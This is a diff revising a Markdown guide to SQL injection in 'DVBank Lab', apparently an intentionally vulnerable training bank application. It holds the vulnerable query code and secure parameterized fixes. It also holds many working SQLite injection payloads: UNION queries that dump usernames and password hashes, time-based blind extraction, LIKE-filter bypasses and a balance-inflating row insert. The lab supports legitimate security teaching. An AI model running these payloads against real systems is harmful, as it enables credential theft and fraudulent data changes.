@@ -22,105 +22,47 @@ query = f"SELECT * FROM user WHERE username = '{username}'"
 
 The attacker's input changes the query's logic from "find user named alice" to "find any user because 1=1 is always true".
 
-### Types of SQL Injection
+### Types of SQL Injection (on this lab)
 
-1. **In-band SQLi (Classic)**
-   - **Union Based**: Combines results of malicious query with original query
-     ```sql
-     ' UNION SELECT username, password FROM user--
-     ```
-   - **Error Based**: Extracts data through database error messages
-     ```sql
-     ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--
-     ```
+DVBank Lab runs on **SQLite** via Python's `sqlite3` driver. That constrains which techniques work:
 
-2. **Inferential SQLi (Blind)**
-   - **Boolean Based**: Infers data by observing true/false responses
-     ```sql
-     ' AND (SELECT CASE WHEN (username = 'admin') THEN 1 ELSE 0 END) = 1--
-     ```
-   - **Time Based**: Infers data by observing response delays
-     ```sql
-     ' AND (SELECT CASE WHEN (username = 'admin') 
-         THEN randomblob(100000000) ELSE randomblob(1) END)--
-     ```
+- `cursor.execute()` runs **one statement only** — stacked queries (`'; UPDATE ...--`, `'; DROP ...--`) are a no-op.
+- There is **no** `@@version`, `SLEEP()`, or `WAITFOR` — those are MySQL/MSSQL and will error.
+- Tables are lowercase `user` and `transaction`; a `UNION` must match the base query's **column count**.
 
-3. **Out-of-band SQLi**
-   - Uses external channels to extract data
-   - Example: Making DNS requests with extracted data
-     ```sql
-     ' AND (SELECT load_extension(
-         (SELECT hex(group_concat(password)) FROM user)
-     ))--
-     ```
+The usable classes here are:
 
-### Common Attack Techniques
-
-1. **Authentication Bypass**
+1. **In-band (UNION-based)** — append a `UNION SELECT` with a matching column count to read other tables:
    ```sql
-   -- Basic bypass
-   ' OR '1'='1
-   
-   -- Comment-based bypass
-   admin'--
-   
-   -- Union-based bypass
-   ' UNION SELECT 'admin', 'hash', 1--
-   ```
-
-2. **Data Extraction**
-   ```sql
-   -- Extract table names
-   ' UNION SELECT name, NULL FROM sqlite_master WHERE type='table'--
-   
-   -- Extract column names
-   ' UNION SELECT sql, NULL FROM sqlite_master WHERE name='user'--
-   
-   -- Extract user data
    ' UNION SELECT username, password_hash FROM user--
    ```
-
-3. **Database Manipulation**
-   ```sql
-   -- Insert new records
-   '; INSERT INTO user VALUES ('hacker','hash',999999)--
-   
-   -- Update records
-   '; UPDATE user SET balance=1000000 WHERE username='alice'--
-   
-   -- Delete records
-   '; DELETE FROM transactions WHERE user_id=1--
-   ```
+2. **Inferential (Blind)** — when results aren't echoed back, infer data one bit at a time:
+   - **Boolean-based**: observe whether a row comes back / a request succeeds.
+     ```sql
+     ' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END)=1--
+     ```
+   - **Time-based**: force a measurable delay with SQLite's `randomblob()`:
+     ```sql
+     ' AND (SELECT CASE WHEN substr(password_hash,1,1)='a'
+         THEN randomblob(100000000) ELSE randomblob(1) END FROM user LIMIT 1)--
+     ```
 
 ### SQLite-Specific Techniques
 
-1. **SQLite System Tables**
-   ```sql
-   -- List all tables
-   ' UNION SELECT name, NULL FROM sqlite_master--
-   
-   -- Get table schema
-   ' UNION SELECT sql, NULL FROM sqlite_master--
-   ```
+- **Enumerate schema** via `sqlite_master`:
+  ```sql
+  ' UNION SELECT name, sql FROM sqlite_master WHERE type='table'--
+  ```
+- **Extract one character at a time** with `substr()` for blind attacks:
+  ```sql
+  ' AND substr((SELECT password_hash FROM user LIMIT 1),1,1)='a'--
+  ```
 
-2. **SQLite Functions**
-   ```sql
-   -- String manipulation
-   ' AND substr((SELECT password FROM user LIMIT 1),1,1)='a'--
-   
-   -- Time-based attacks
-   ' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) 
-       ELSE randomblob(1) END)--
-   ```
-
-3. **SQLite Type Exploitation**
-   ```sql
-   -- Type coercion
-   ' AND typeof((SELECT balance FROM user LIMIT 1))='integer'--
-   
-   -- CAST exploitation
-   ' AND CAST((SELECT password FROM user) AS INTEGER)--
-   ```
+> 💡 **Stacked queries do not work here.** Payloads like `'; UPDATE user SET balance=...--`,
+> `'; DELETE FROM ...--`, or `'; DROP TABLE ...--` are no-ops on `sqlite3` because
+> `execute()` only runs the first statement. `INSERT`/`UPDATE`/`DELETE` injection is only
+> reachable where the application's *own* query is already an `INSERT`/`UPDATE` (see
+> Registration below) — never by chaining a second statement.
 
 ## Overview
 
@@ -135,9 +77,9 @@ SQL Injection vulnerabilities in DVBank Lab exist in multiple critical endpoints
 query = f"SELECT * FROM user WHERE username = '{username}'"
 user = db.session.execute(query).fetchone()
 
-# The application returns:
-# - "Invalid credentials" if no user is found
-# - Redirects to dashboard if user is found
+# The result is then gated on the password:
+#   if user and User.query.get(user[0]).check_password(password):
+# On success it returns ONLY a token + {id, username, balance}.
 ```
 
 > 🤔 **Challenge Note**: 
@@ -152,26 +94,27 @@ user = db.session.execute(query).fetchone()
 > 3. Consider how timing attacks might help
 > 4. Can you extract data without seeing it directly?
 
-**Attack Vectors**:
+**Attack Vectors** (blind / time-based only — see Challenge Note):
+
+The query result is gated by `check_password()`, and the endpoint returns only a token plus
+`id`/`username`/`balance`. So `' OR '1'='1' --` and `UNION` neither authenticate nor echo any
+data. The only usable channel is **timing**, using SQLite's `randomblob()` (there is no
+`SLEEP`/`WAITFOR` on `sqlite3`):
+
 ```sql
--- Basic Authentication Bypass
-username: ' OR '1'='1' --
-password: anything
-
--- Union-Based Attack (Extract all users)
-username: ' UNION SELECT * FROM user --
-password: anything
-
--- Extract specific user
-username: alice' AND '1'='1
+-- Time-based extraction: a long delay means the guessed character is correct
+username: admin' AND (SELECT CASE
+    WHEN substr(password_hash,1,1)='a'
+    THEN randomblob(100000000) ELSE randomblob(1) END
+    FROM user WHERE username='admin')--
 password: anything
 ```
 
+Iterate the character value and position to recover the hash one byte at a time.
+
 **Real-World Impact**:
-- Attackers can extract entire database content
-- Password hashes can be stolen
-- Account balances can be discovered
-- All without leaving obvious traces in logs
+- Password hashes (unsalted MD5) and balances can be extracted bit-by-bit via timing, then cracked offline
+- Every attempt — success or failure — is recorded in `LoginAttempt` (`auth_routes.py:52-59`, `77-84`), so this activity is logged, not trace-free
 
 > 💡 **Hints for the Challenge**:
 > 1. Think about boolean logic:
@@ -202,34 +145,43 @@ db.session.execute(insert_query)
 
 **Attack Vectors**:
 ```sql
--- Create admin user with high balance
-username: admin', 'hash', 1000000) --
-password: anything
-
--- Modify other user's data
-username: alice', 'newhash', 999999), ('bob
+-- Inject a row with an attacker-chosen balance (the INSERT itself runs)
+username: hacker', 'hash', 1000000) --
 password: anything
 ```
+
+> 🤔 **Reality check**: This `INSERT` *does* execute and write the row, but the handler then
+> runs `User.query.filter_by(username=username).first()` (`auth_routes.py:26-28`) using the
+> full injected string as the username — which does not match the `hacker` row it just
+> created — so `user.id` dereferences `None` and the request returns a 500. The malicious
+> row is still persisted.
+>
+> There is **no** "modify another user" vector here: this is an `INSERT`, which can only add
+> rows. A multi-row payload targeting an existing user (e.g. `alice`) hits the
+> `UNIQUE(username)` constraint and the whole statement aborts.
 
 ### 3. Transaction Processing
 **Location**: `backend/routes/transaction_routes.py`
 ```python
-# Vulnerable: Unparameterized transaction query
-query = f"SELECT * FROM transactions WHERE user_id = {user_id}"
+# Vulnerable: ?user_id= is interpolated TWICE, unparameterized
+user_id = request.args.get('user_id', current_user.id)
+query = f'SELECT * FROM "Transaction" WHERE sender_id = {user_id} OR receiver_id = {user_id} ORDER BY created_at DESC'
 transactions = db.session.execute(query).fetchall()
 ```
 
-**Attack Vectors**:
+**Attack Vectors** (via the `?user_id=` query parameter):
 ```sql
--- View all transactions
-user_id: 1 OR 1=1
+-- View every transaction (filter is always true)
+?user_id=0 OR 1=1
 
--- Union attack to see other users' transactions
-user_id: 1 UNION SELECT * FROM transactions
-
--- Modify transaction amounts
-user_id: 1; UPDATE transactions SET amount = 1000000 WHERE id = 1--
+-- UNION to dump credentials from the user table.
+-- SELECT * FROM "Transaction" returns 8 columns, so the UNION must supply 8.
+-- Because user_id is interpolated TWICE, a trailing comment is required to kill
+-- the second "OR receiver_id = ..." clause:
+?user_id=0 UNION SELECT id,username,password_hash,balance,role,'x','x','x' FROM user-- 
 ```
+
+> 💡 Note there is no working `; UPDATE ...` here — stacked statements don't run on `sqlite3`.
 
 ### 4. Transaction Search
 **Location**: `backend/routes/transaction_routes.py`
@@ -262,26 +214,26 @@ def search_transactions(current_user):
     return jsonify(transaction_list)
 ```
 
-**Attack Vectors**:
+**Attack Vectors** (via the `?description=` query parameter; the term is wrapped in `'%...%'`):
 ```sql
--- Bypass the user's transaction filter
-' OR '1'='1
+-- NO-OP: a bare ' OR '1'='1 (or '; --) does NOT widen access here. AND binds tighter
+-- than OR, and the trailing %' makes the OR clause '1'='1%' false, so you stay scoped
+-- to your own rows. You must close the LIKE string and comment out the trailing %':
 
--- Use comment to manipulate query
-'; --
+-- Bypass the user filter (see every user's transactions)
+%' OR '1'='1' -- 
 
--- Extract data with UNION
-' UNION SELECT id, user_id, user_id, 100.0, 'Hacked', 'completed', datetime(), datetime() FROM user WHERE '1'='1
+-- UNION to dump credentials (8 columns to match SELECT * FROM "transaction")
+%' UNION SELECT id, username, password_hash, 1.0, username, 'x', 'x', 'x' FROM user -- 
 
--- Advanced attack to gather database schema
-' UNION SELECT name, 1, 1, 1.0, sql, 'test', datetime(), datetime() FROM sqlite_master WHERE type='table' AND '1'='1
+-- Enumerate the database schema
+%' UNION SELECT name, sql, 1, 1.0, 'x', 'x', 'x', 'x' FROM sqlite_master WHERE type='table' -- 
 ```
 
 **Impact**:
 - Exposure of transactions from other users
 - Access to sensitive financial data
 - Potential extraction of the entire database schema
-- Possible manipulation of transaction history
 
 **Secure Alternative**:
 ```python
@@ -317,20 +269,18 @@ result = db.session.execute(query, {
 ## Detection Techniques
 
 ### 1. Manual Testing
-Test each endpoint with these payloads:
+This lab is SQLite — probe accordingly (no `@@version`, `SLEEP()`, or `WAITFOR`):
 ```sql
--- Basic tests
-' OR '1'='1
-1 OR 1=1
-' UNION SELECT NULL--
+-- Error-based: a lone single quote forces a syntax error (confirms injection)
+'
 
--- Error-based tests
-' AND 1=convert(int,@@version)--
-' AND 1=cast((SELECT @@version) as int)--
+-- Boolean: compare a true vs a false condition and watch the response differ
+' OR '1'='1' --      -- (close the string / comment as the surrounding context requires)
+' OR '1'='2' --
 
--- Time-based tests
-'; WAITFOR DELAY '0:0:5'--
-' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+-- Time-based: randomblob() is SQLite's delay primitive
+' AND randomblob(100000000) --
+' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE randomblob(1) END) --
 ```
 
 ### 2. Automated Testing
@@ -356,7 +306,7 @@ db.session.execute(query, {
 })
 
 # Safe transaction query
-query = "SELECT * FROM transactions WHERE user_id = :user_id"
+query = 'SELECT * FROM "Transaction" WHERE sender_id = :user_id OR receiver_id = :user_id ORDER BY created_at DESC'
 transactions = db.session.execute(query, {'user_id': user_id}).fetchall()
 ```
 
@@ -395,48 +345,25 @@ transaction = Transaction.query.get(transaction_id)
    - Implement proper parameterization
 
 2. **Registration Exploitation**
-   - Create users with manipulated balances
-   - Attempt to modify existing users
+   - Create a user with a manipulated balance and confirm the row is written despite the 500
+   - Explain why an INSERT cannot modify an existing user's row
    - Fix the registration endpoint
 
 3. **Transaction Analysis**
-   - Extract all transactions using injection
-   - Extract all usernames and password hashes using UNION injection
+   - Extract all transactions using injection via `?user_id=`
+   - Extract all usernames and password hashes using an 8-column UNION
    - Implement secure transaction queries
 
 4. **Transaction Search Exploitation**
-   - Test the search functionality with simple SQL injection payloads
-   - Try to bypass the user filter to see other users' transactions
-   - Use UNION attacks to extract database schema information
-   - Implement a secure parameterized query version of the search functionality
-   - Compare the vulnerable and secure implementations
+   - Confirm that a bare `' OR '1'='1` is a no-op, then bypass the filter with `%' OR '1'='1' -- `
+   - Use an 8-column UNION to extract other users' credentials
+   - Use UNION against `sqlite_master` to extract schema information
+   - Implement a secure parameterized version and compare it to the vulnerable one
 
 ## Additional Resources
 
 1. [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
-2. [SQLite Injection Techniques](https://www.sqlite.org/security.html)
-3. [SQLAlchemy Security Considerations](https://docs.sqlalchemy.org/en/14/core/security.html)
-4. [OWASP SQL Injection Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
-5. [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
-6. [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
-7. [NIST Database Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-123.pdf)
-8. [Python DB-API Specification](https://www.python.org/dev/peps/pep-0249/)
-9. [SQLAlchemy ORM Tutorial](https://docs.sqlalchemy.org/en/14/orm/tutorial.html)
-10. [MySQL Security Best Practices](https://dev.mysql.com/doc/refman/8.0/en/security.html)
-
-### Related Tools
-1. [SQLMap](https://github.com/sqlmapproject/sqlmap) - SQL injection testing tool
-2. [NoSQLMap](https://github.com/codingo/NoSQLMap) - NoSQL injection testing
-3. [SQLiScanner](https://github.com/0xbug/SQLiScanner) - Automatic SQL injection detection
-4. [jSQL Injection](https://github.com/ron190/jsql-injection) - Java-based SQL injection tool
-
-### Industry Standards
-1. [PCI DSS SQL Requirements](https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf)
-2. [HIPAA Database Security](https://www.hhs.gov/hipaa/for-professionals/security/guidance/index.html)
-
-### Practice Platforms
-1. [SQLZoo](https://sqlzoo.net/) - SQL learning and practice
-2. [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
-3. [HackTheBox SQL Injection Challenges](https://www.hackthebox.eu/)
+2. [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
+3. [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
 
 ⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments. 
